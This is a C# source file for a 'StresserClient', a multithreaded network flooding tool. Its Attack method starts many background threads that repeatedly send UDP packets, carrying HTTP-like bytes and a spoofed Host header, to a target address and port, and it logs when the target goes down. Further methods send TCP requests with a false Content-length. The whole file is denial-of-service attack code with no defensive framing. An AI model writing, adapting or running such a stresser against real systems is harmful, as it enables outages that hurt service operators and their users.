using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;


namespace StresserClient
{
    public class Client
    {
        private byte[] packet = System.Text.ASCIIEncoding.ASCII.GetBytes("This is a test.");

        public readonly string ip = "localhost";
        public readonly int port = 0;
        public readonly string fakeIp = "www.nixmger.com";

        Byte[] sendBytes1;
        Byte[] sendBytes2;

        private bool run = true;

        public Client(string ip, int port)
        {
            this.ip = ip;
            this.port = port;
            this.sendBytes1 = Encoding.ASCII.GetBytes("GET /" + ip + "HTTP/1.1\r\n");
            this.sendBytes2 = Encoding.ASCII.GetBytes("Host: " + fakeIp + "\r\n\r\n");
        }

        public Client()
        {

        }

        public void SendTcp()
        {
            TcpClient client = new TcpClient();
            client.NoDelay = true;
            client.Connect(ip, port);
            StreamWriter stream = new StreamWriter(client.GetStream());
            stream.Write("POST / HTTP/1.1\r\nHost " + ip + "\r\nContent-length: 5000\r\n\r\n");
            stream.Close();
            client.Close();
        }

        public void SendUdp()
        {
            UdpClient client = new UdpClient(ip, port);
            client.Send(sendBytes1, sendBytes1.Length);
            //client.Close();
        }

        public void SendSocket()
        {
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            client.Connect(endPoint);
            client.SendTo(sendBytes1, endPoint);
            client.SendTo(sendBytes2, endPoint);
            //client.Close();
        }



        public void Stop()
        {
            run = false;
        }

        public void Attack(int threads)
        {
            for (int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    //Thread.CurrentThread.Name = $"Thread{i}";

                    while (run)
                    {
                        try
                        {
                            SendSocket();
                            Console.WriteLine("Thread {0} has successfully attacked", Thread.CurrentThread);
                        }
                        catch (System.Net.Sockets.SocketException)
                        {
                            // Target is down
                            Console.WriteLine("Thread {0} unable to attack", Thread.CurrentThread);
                        }
                    }

                    //SendSocket();


                    Console.WriteLine("Thread {0} stopped attacking", Thread.CurrentThread);

                    return;

                    //Console.WriteLine("Post return");
                }).Start();
            }
        }
    }
}
